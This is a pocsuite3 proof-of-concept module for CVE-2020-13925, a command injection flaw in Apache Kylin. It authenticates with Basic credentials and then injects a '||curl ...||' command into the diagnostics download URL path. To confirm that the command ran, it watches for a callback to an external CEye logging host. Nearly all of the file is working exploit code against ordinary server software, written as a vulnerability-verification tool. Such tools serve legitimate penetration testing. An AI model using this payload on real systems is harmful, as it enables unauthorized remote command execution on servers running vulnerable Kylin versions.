# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/3/13 10:15
# Product   : PyCharm
# Project   : pocsuite3
# File      : Apache_Kylin_CVE_2020_13925.py
# explain   : 文件说明
"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import re
from collections import OrderedDict
from urllib.parse import urljoin
from base64 import b64encode
from pocsuite3.api import CEye
from requests.cookies import RequestsCookieJar
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str
from pocsuite3.lib.core.interpreter_option import OptString

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-03-13'
    createDate = '2021-03-13'
    updateDate = '2021-03-13'
    references = ['http://code2sec.com/cve-2020-13925-apache-kylinming-ling-zhu-ru-lou-dong.html']
    name = 'CVE-2020-13925 Apache Kylin命令注入漏洞'
    appPowerLink = ''
    appName = 'Apache Kylin'
    appVersion = '< 3.0.3'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        CVE-2020-13925 Apache Kylin命令注入漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    token = "xxxxxxxxxxxxxx"    #ceye认证token

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        o["password"] = OptString('', description='这个poc需要用户密码，请输入用户密码', require=True)
        return o

    def login(self):
        login_url = urljoin(self.url, '/kylin/api/user/authentication')
        login_data = b64encode((self.get_option("username") + ":" + self.get_option("password")).encode("utf-8"))
        headers = {"Authorization": "Basic %s" % login_data.decode('utf-8')}
        post_data = {}
        try:
            resp = requests.post(login_url, data=post_data, headers=headers)
            if resp.status_code == 401:
                logger.info("账号或密码错误")
            if resp.status_code == 200:
                cookies =  requests.utils.dict_from_cookiejar(resp.cookies)
                cookie = "JSESSIONID="+cookies["JSESSIONID"]
                logger.info("获得的Cookie为：%s" % cookie)
                logger.info("Apache_Kylin登录成功")
            else:
                logger.info("Apache_Kylin登录失败，响应状态码为 %s " % str(resp.status_code))
        except Exception as e:
            logger.warn(str(e))
            logger.warn("Apache_Kylin登录失败")
        return cookie

    def _verify(self):
        result = {}
        cookies = self.login()
        CEye_main = CEye(token=self.token)
        ceye_subdomain = CEye_main.getsubdomain()
        random_uri = random_str(16)
        logger.info("random_url为：%s" % random_uri)
        verify_payload = "curl%20" + random_uri + "." + str(ceye_subdomain)
        veri_url = urljoin(self.url, '/kylin/api/diag/project/%7c%7c'+verify_payload+'%7c%7c/download')
        headers = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Cookie": cookies
        }
        logger.info("Headres如下：")
        logger.info(headers)
        try:
            resp = requests.get(veri_url,headers=headers)
            if CEye_main.verify_request(random_uri):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = verify_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
